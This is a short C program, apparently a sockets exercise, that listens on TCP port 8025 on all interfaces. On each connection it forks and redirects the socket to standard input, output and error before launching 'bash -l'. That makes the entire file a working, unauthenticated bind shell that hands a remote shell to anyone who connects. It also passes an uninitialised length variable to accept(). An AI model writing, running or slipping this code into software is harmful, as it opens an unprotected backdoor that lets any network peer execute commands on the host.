#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* check error function */
void checkError(int status)
{
        if(status<0)
        {
                printf("socket error: [%s]\n", strerror(errno));
                exit(-1);
        }
}

int main(int argc,char* argv[]) {
        // Create a socket
        int sid = socket(PF_INET,SOCK_STREAM,0);
        // setup our address -- will listen on 8025 --
        struct sockaddr_in addr;
        // addr.sin_len = sizeof(addr); not working with this line
        addr.sin_family = AF_INET;
        addr.sin_port = htons(8025);
        addr.sin_addr.s_addr = INADDR_ANY;
        // pairs the newly created socket with the requested address.
        int status = bind(sid,(struct sockaddr*)&addr,sizeof(addr));
        checkError(status);
        // listen on that socket for "Let's talk" message.
        status = listen(sid,10);
        checkError(status);

        while(1) {
                struct sockaddr_in client;
                socklen_t clientSize;
                int chatSocket = accept(sid, (struct sockaddr*)&client, &clientSize);
                checkError(chatSocket);
                printf("We accepted a socket: %d\n",chatSocket);
                // once accepted, fork a child
                pid_t value = fork();
                if(value<0) //error
                {
                        printf("Fork failed");
                        exit(-1);
                } else if(value==0) { // child
                        //close(chatSocket);
                        //dup(0);
                        //close(charScoket);
                        //dup(1);
                        //close(charSocket);
                        //dup(2);

                        dup2(chatSocket, 0); //STDIN
                        dup2(chatSocket, 1); //STDOUT
                        dup2(chatSocket, 2); //STDERR
                        /* close the server socket */
                        close(chatSocket);
                        /* gut and upgrade to call bash */
                        execlp("bash", "bash", "-l", NULL); // got rid of -i
                } else{ // parent
                        close(chatSocket);
                        //wait(0);
                        //pid_t dead;
                }
        }
        return 0;
}
